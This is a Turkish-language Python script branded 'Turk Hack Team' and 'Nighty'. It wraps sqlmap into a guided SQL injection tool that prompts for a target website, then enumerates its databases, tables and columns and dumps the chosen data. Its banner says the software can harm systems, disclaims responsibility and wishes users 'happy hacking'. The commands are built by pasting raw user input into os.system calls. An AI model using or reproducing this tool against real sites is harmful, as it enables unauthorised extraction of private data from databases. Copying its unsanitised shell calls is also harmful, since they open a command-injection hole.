import os 
import sys
import socket
import random
import time
hazir = True
while hazir:
     z = random.random()
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[                    ] 0% ")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[==                  ] 10%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Nighty")
     print ("[====                ] 20%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Nighty")
     print ("[======              ] 30%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[========            ] 40%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[==========          ] 50% ")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Nighty")
     print ("[============        ] 60% ")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Nighty")
     print ("[==============      ] 70%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[================    ] 80%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[==================  ] 90%")
     time.sleep(z)
     os.system("clear")
     os.system("figlet Turk Hack Team")
     print ("[====================] 100%")
     time.sleep(0.6)
     hazir = False
print("""
     
                  ***************************************************
                  *      Bu yazılım sistemlere zarar verebilir!!    *
                  *                                                 *
                  * sqlmapproject ve Nighty verilen hasardan sorumlu*
                  * değildir.                                       *
                  *            HEPİNİZE İYİ HACKLEMELER             *
                  *                                                 *
                  *           ☪                         ☪           *
                  ***************************************************
     
     
     [---]                         SQL Injection aracı                           [---]
     [---]                                                                       [---]
     [---]        sqlmapproject kişisinin sqlmap yazılımını kullanmaktadır       [---]
     [---]                                                                       [---]
     [---]            Nighty taradından kodlandı ve kolaylaştırıldı              [---]                                 
     [---]              							    [---]
     [---]                            TURK HACK TEAM  	                    [---]
     
     Lütfen 1 den başlayıp 4 de kadar teker teker ilerleyiniz
     
     1.adım-Sitenin veri tabanları
     2.adım-Veri tabanının içindeki tablolar
     3.adım-Tabloların içindeki sütunlar
     4.adım-Bilgileri sonuçlama
     
""")
def database():
     os.system('python sqlmap.py -u"' + site + '" --dbs')
def tables():
     os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' --tables')
def columns():
     os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' -T ' + tablo + ' --columns')
def dump():
     os.system('python sqlmap.py -u"' + site + '" -D ' + veri_tabani + ' -T ' + tablo + ' -C' + sonuc + ' --dump')
devam = True
site = input('Site linki giriniz: ')
while devam:
     print("--------------------------------------------------------------------------------")
     os.system("figlet ___Nighty___ TURK HACK TEAM")
     print("--------------------------------------------------------------------------------")
     database()
     veri_tabani = input("Veri tabanı ismi giriniz: ")
     tables()    
     tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
     if(tablo=='geri'):
          while tablo=='geri':
               database()
               veri_tabani = input("Veri tabanı ismi giriniz: ")
               tables()    
               tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
     if(tablo!='geri'):
          pass
     columns()
     sonuc = input("Almak istediğiniz bilgi adı(geri dönmek için:'geri' yazabilirsin):  ")
     if(sonuc=='geri'):
          while sonuc=='geri':
               tables()    
               tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
               if(tablo=='geri'):
                    while tablo=='geri':
                         database()
                         veri_tabani = input("Veri tabanı ismi giriniz: ")
                         tables()    
                         tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
               if(tablo!='geri'):
                    pass
               columns()
               sonuc = input("Almak istediğiniz bilgi adı(geri dönmek için:'geri' yazabilisin): ")
     dump()
     ileri = input("Çıkmak için ENTER'e basın(geri dönmek için 'geri' yazabilirsin): ")
     if(ileri=='geri'):
          while ileri=='geri':
               columns()
               sonuc = input("Almak istediğiniz bilgi adı(geri dönmek için:'geri' yazabilirsin):  ")
               if(sonuc=='geri'):
                    while sonuc=='geri':
                         tables()    
                         tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
                         if(tablo=='geri'):
                              while tablo=='geri':
                                   database()
                                   veri_tabani = input("Veri tabanı ismi giriniz: ")
                                   tables()    
                                   tablo = input("Tablo ismi giriniz (geri dönmek için:'geri' yazabilirsin): ")
                         if(tablo!='geri'):
                              pass
                         columns()
                         sonuc = input("Almak istediğiniz bilgi adı(geri dönmek için:'geri' yazabilisin): ")
               dump()
               ileri = input("Çıkmak için ENTER'e basın(geri dönmek için 'geri' yazabilirsin): ")
     devam = False
os.system("figlet G O R U S M E K __U Z E R E__")    
